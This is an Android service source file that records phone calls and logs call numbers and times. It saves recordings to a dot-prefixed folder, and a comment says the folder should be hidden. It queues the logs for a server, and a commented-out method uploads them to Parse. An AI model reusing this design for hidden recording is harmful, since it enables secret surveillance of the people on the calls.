package root.ackla.com.batchroot;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.TelephonyManager;

import com.aykuttasil.callrecord.CallRecord;
import com.parse.ParseObject;

import root.ackla.com.batchroot.model.CallLog;
import root.ackla.com.batchroot.utils.Keys;
import root.ackla.com.batchroot.utils.UiUtils;

/**
 * Created by ankurrawal on 21/9/17.
 */

public class MainService extends Service implements Keys {

    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    private static boolean isIncoming;
    private static String savedNumber;
    private Context mcontext;

    @Override
    public IBinder onBind(Intent intent) {

        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        mcontext = this;
//        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void onCallStateChanged(Context context, int state, String number) {
        if (lastState == state) {
            //No change, debounce extras
            return;
        }
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                isIncoming = true;
                savedNumber = number;
//                BatchRootApplication.Logger("Call: ", Keys.INCOMING_CALL_RINGING + savedNumber + " Call time " + UiUtils.getLocalTime());
                initializeCallRecord();
                storeLogs(Keys.INCOMING_CALL_RINGING, Keys.CALL_TYPE_INCOMING, savedNumber);
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
                if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                    isIncoming = false;
//                    BatchRootApplication.Logger("Call: ", Keys.OUTGOING_CALL_STARTED + savedNumber + " Call time " + UiUtils.getLocalTime());
                    initializeCallRecord();
                    storeLogs(Keys.OUTGOING_CALL_STARTED, Keys.CALL_TYPE_OUTGOING, savedNumber);
                }
                break;
            case TelephonyManager.CALL_STATE_IDLE:
                //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                    //Ring but no pickup-  a miss
//                    BatchRootApplication.Logger("Call: ", Keys.RINGING_NO_PICKUP + savedNumber + " Call time " + UiUtils.getLocalTime());
                    BatchRootApplication.callRecord.stopCallReceiver();
                    storeLogs(Keys.RINGING_NO_PICKUP, Keys.CALL_TYPE_MISSED, savedNumber);
                    //stopCallRecording();
                } else if (isIncoming) {
//                    BatchRootApplication.Logger("Call: ", Keys.INCOMING_CALL_FINISHED + savedNumber + " Call time " + UiUtils.getLocalTime());
                    BatchRootApplication.callRecord.stopCallReceiver();
                    stopCallRecording();
                    storeLogs(Keys.INCOMING_CALL_FINISHED, Keys.CALL_TYPE_INCOMING, savedNumber);
                } else {
//                    BatchRootApplication.Logger("Call: ", Keys.OUTGOING_CALL_FINISHED + savedNumber + " Call time " + UiUtils.getLocalTime());
                    BatchRootApplication.callRecord.stopCallReceiver();
                    stopCallRecording();
                    storeLogs(Keys.OUTGOING_CALL_FINISHED, Keys.CALL_TYPE_OUTGOING, savedNumber);
                }
                break;
        }
        lastState = state;
    }

    private void initializeCallRecord() {

        try {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    BatchRootApplication.callRecord = new CallRecord.Builder(BatchRootApplication.getInstance())
                            .setRecordFileName("RecordFileName")
                            .setRecordDirName(".RecordDirName") // nedd to hide this folder and also need to add all log files and recording in one
                            .setRecordDirPath(Environment.getExternalStorageDirectory().getPath()) // optional & default value
                            .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB) // optional & default value
                            .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB) // optional & default value
                            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION) // optional & default value
                            .setShowSeed(true) // optional & default value ->Ex: RecordFileName_incoming.amr || RecordFileName_outgoing.amr
                            .build();

                    BatchRootApplication.callRecord.startCallReceiver();
                }
            }, 200);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    private void stopCallRecording() {
        try {
            BatchRootApplication.callRecord.stopCallReceiver();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //We listen to two intents.  The new out
        // going call only tells us of an outgoing call.  We use it to get the number.
        if (intent != null) {
            if (intent.getAction().equals(BatchRootApplication.BROADCAST_INTENT_CALL_OUTGOING)) {
                savedNumber = intent.getStringExtra("savedNumber");
            } else if (intent.getAction().equals(BatchRootApplication.BROADCAST_INTENT_CALL)) {
                String stateStr = intent.getStringExtra("statestr");
                String number = intent.getStringExtra("number");
                int state = 0;
                if (stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                    state = TelephonyManager.CALL_STATE_IDLE;
                } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                    state = TelephonyManager.CALL_STATE_OFFHOOK;
                } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    state = TelephonyManager.CALL_STATE_RINGING;
                }

                onCallStateChanged(mcontext, state, number);
            }
        }
        return START_STICKY;
    }


//    private BroadcastReceiver onNotice = new BroadcastReceiver() {
//
//        @Override
//        public void onReceive(Context context, Intent intent) {
//            String pack = intent.getStringExtra("package");
//            String title = intent.getStringExtra("title");
//            String text = intent.getStringExtra("text");
//            BatchRootApplication.Logger("Notification", "Package: " + pack + "  Tittle: " + title + " Text: " + text);
//        }
//    };


    /**
     * logToParse store the param into dedicated table in Back$App on Parse Platform
     *
     * @param contactNumber
     * @param callStatus
     * @param savedName
     */
    private void logToParse(String contactNumber, String callStatus, String savedName) {
        ParseObject storeLog = new ParseObject("CallLogs");
        storeLog.put("contactnumber", contactNumber);
        storeLog.put("savedname", savedName);
        storeLog.put("calltype", callStatus);
        storeLog.put("timestamp", System.currentTimeMillis());
        storeLog.saveInBackground();
    }

    private void storeLogs(String call_status, String call_type, String savedNumber) {

        try {
            CallLog callLog = new CallLog();
            callLog.setCallStatus(call_status);
            callLog.setCalltype(call_type);
            callLog.setContactNumber(savedNumber);
            callLog.setSavedName(savedNumber);
            callLog.setTimestamp(System.currentTimeMillis());
            callLog.setDateTime(UiUtils.getLocalTime());
            callLog.setUpdateToServer(false);

            BatchRootApplication.getDaoSession().getCallLogDao().insert(callLog);
            //logToParse(savedNumber, "Incoming Call Ringing", savedNumber);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
